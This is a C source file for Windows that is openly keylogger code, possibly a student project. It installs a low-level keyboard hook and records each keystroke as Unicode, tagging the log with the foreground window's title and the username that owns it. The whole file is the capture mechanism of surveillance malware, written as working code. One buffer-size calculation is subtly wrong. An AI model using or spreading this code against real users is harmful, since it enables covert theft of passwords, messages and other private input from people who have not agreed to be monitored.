#include "winkey.h"

extern HHOOK winHook;
extern HWND gh_hwndMain;
extern BOOL foregroundWindowChanged;
extern char foregroundWindowTitle[4096];

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode != HC_ACTION ||( wParam != WM_KEYDOWN &&  wParam != WM_SYSKEYDOWN && wParam != WM_SYSKEYUP && wParam != WM_KEYUP))  // do not process message if nCode < 0
        return CallNextHookEx(winHook, nCode, wParam, lParam); 
    PKBDLLHOOKSTRUCT keyInfos = (PKBDLLHOOKSTRUCT)lParam;// struct qui contient les informations concernant la frappe.
    HWND foregroundWindow =  GetForegroundWindow();
    DWORD foregroundWindowPID;
    DWORD foregroundWindowTID = GetWindowThreadProcessId(foregroundWindow, &foregroundWindowPID);
    WCHAR keyByte[5] = {0};//for unicode we may need more than 1 byte
    BYTE keyState[256] = {0};
    HKL keyboardLayout = GetKeyboardLayout(foregroundWindowTID);
    INT res = 0;
    char foregroundWindowUsername[4096];

    if (foregroundWindowChanged)
    {
        foregroundWindowChanged = FALSE;
        SYSTEMTIME lt;    
        GetLocalTime(&lt);
        GetUsernameOfForegroundWindow(foregroundWindowUsername, foregroundWindowPID);
        size_t sz = strlen("[Foreground window's user : %s][Foreground window's title : %s]\n") + strlen(foregroundWindowTitle) + strlen(foregroundWindowUsername + 1);
        LPSTR toLog = malloc(sizeof(char) * sz);
        if (toLog == NULL)
            log("\n[malloc for loggin failed]\n", CHAR_MODE, TRUE);
        else
        {
            sprintf_s(toLog, sz, "[Foreground window's user : %s][Foreground window's title : %s]\n", foregroundWindowUsername,  foregroundWindowTitle);
            log(toLog, CHAR_MODE, TRUE);
            REEF(toLog);
        }
    }
    // We need to set ourself the keyState because we are in KEYBOARD_LL mode which capture keys BEFORE the target thread receive the key
    // GetKeyBoardState do not work because it gets the state after us, not in the same time. There is no GetAsyncKeyboardState unfortunatly.
    for (int i = 0; i != 256; i++)
    {
        if (GetAsyncKeyState(i) & 0x8000)
            keyState[i] = 0x80; 
        else if (GetAsyncKeyState(i) & 0x1)
            keyState[i] = 0x1;
    }
    if (wParam != WM_KEYUP)
        LogvKey(keyInfos->vkCode, 0);
    if (keyState[VK_CONTROL] != 0X80 && keyState[VK_MENU] != 0X80)
        res = ToUnicodeEx(keyInfos->vkCode, keyInfos->scanCode, keyState, (LPWSTR)&keyByte, 4, 0x4, keyboardLayout);
    else if ((keyState[VK_CONTROL] == 0X80 || keyState[VK_MENU] == 0X80) && wParam != WM_KEYUP)
        LogvKey(keyInfos->vkCode, 1);
    if (res > 0 && wParam != WM_KEYUP)
        log(keyByte, WCHAR_MODE, FALSE);
    fflush(NULL);
    return CallNextHookEx(winHook, nCode, wParam, lParam);
}

VOID CALLBACK WinEventProc(HWINEVENTHOOK hWinEventHook, DWORD event, HWND hwnd, LONG idObject, LONG idChild, DWORD idEventThread, DWORD dwmsEventTime)
{
    (void)hWinEventHook;
    (void)event;
    (void)idObject;
    (void)idChild;
    (void)idEventThread;
    (void)dwmsEventTime;
    GetWindowTitle(hwnd);
}

